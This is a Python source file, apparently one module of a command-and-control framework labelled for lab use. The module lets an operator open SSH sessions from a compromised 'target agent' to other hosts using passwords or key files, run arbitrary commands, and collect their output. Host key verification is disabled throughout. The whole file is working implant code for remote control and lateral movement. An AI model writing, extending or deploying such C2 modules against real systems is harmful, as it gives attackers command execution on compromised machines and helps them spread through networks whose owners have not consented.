"""
SSH Module — C2 Feature #1
Opens/manages SSH sessions on the target agent via Paramiko.
For educational/lab use only.
"""

import paramiko
import socket
import threading
import json
from typing import Optional


class SSHModule:
    """Manages SSH connections opened from/to the target agent."""

    def __init__(self):
        self.active_sessions: dict[str, paramiko.SSHClient] = {}
        self._lock = threading.Lock()

    # ------------------------------------------------------------------
    # Public API (called by the server dispatcher)
    # ------------------------------------------------------------------

    def handle(self, payload: dict) -> dict:
        """
        Route an SSH command from the operator.

        Expected payload keys:
            action      : "connect" | "exec" | "disconnect" | "list"
            session_id  : str  (required for exec / disconnect)
            host        : str  (required for connect)
            port        : int  (default 22)
            username    : str  (required for connect)
            password    : str  (optional — prefer key_path)
            key_path    : str  (path to private key, optional)
            command     : str  (required for exec)
        """
        action = payload.get("action", "")
        handlers = {
            "connect":    self._connect,
            "exec":       self._exec,
            "disconnect": self._disconnect,
            "list":       self._list_sessions,
        }
        fn = handlers.get(action)
        if fn is None:
            return {"status": "error", "message": f"Unknown SSH action: {action!r}"}
        return fn(payload)

    # ------------------------------------------------------------------
    # Internal handlers
    # ------------------------------------------------------------------

    def _connect(self, p: dict) -> dict:
        host     = p.get("host")
        port     = int(p.get("port", 22))
        username = p.get("username")
        password = p.get("password")
        key_path = p.get("key_path")
        session_id = p.get("session_id", f"{host}:{port}")

        if not host or not username:
            return {"status": "error", "message": "host and username are required"}

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            if key_path:
                pkey = paramiko.RSAKey.from_private_key_file(key_path)
                client.connect(host, port=port, username=username, pkey=pkey, timeout=10)
            else:
                client.connect(host, port=port, username=username,
                               password=password, timeout=10)
        except (paramiko.AuthenticationException,
                paramiko.SSHException,
                socket.error) as exc:
            return {"status": "error", "message": str(exc)}

        with self._lock:
            self.active_sessions[session_id] = client

        return {"status": "ok", "session_id": session_id,
                "message": f"SSH session {session_id!r} established"}

    def _exec(self, p: dict) -> dict:
        session_id = p.get("session_id")
        command    = p.get("command")

        if not session_id or not command:
            return {"status": "error", "message": "session_id and command are required"}

        with self._lock:
            client = self.active_sessions.get(session_id)
        if client is None:
            return {"status": "error", "message": f"No active session: {session_id!r}"}

        try:
            _, stdout, stderr = client.exec_command(command, timeout=30)
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            exit_code = stdout.channel.recv_exit_status()
        except paramiko.SSHException as exc:
            return {"status": "error", "message": str(exc)}

        return {
            "status":    "ok",
            "stdout":    out,
            "stderr":    err,
            "exit_code": exit_code,
        }

    def _disconnect(self, p: dict) -> dict:
        session_id = p.get("session_id")
        with self._lock:
            client = self.active_sessions.pop(session_id, None)
        if client:
            client.close()
            return {"status": "ok", "message": f"Session {session_id!r} closed"}
        return {"status": "error", "message": f"No active session: {session_id!r}"}

    def _list_sessions(self, _p: dict) -> dict:
        with self._lock:
            return {"status": "ok", "sessions": list(self.active_sessions.keys())}
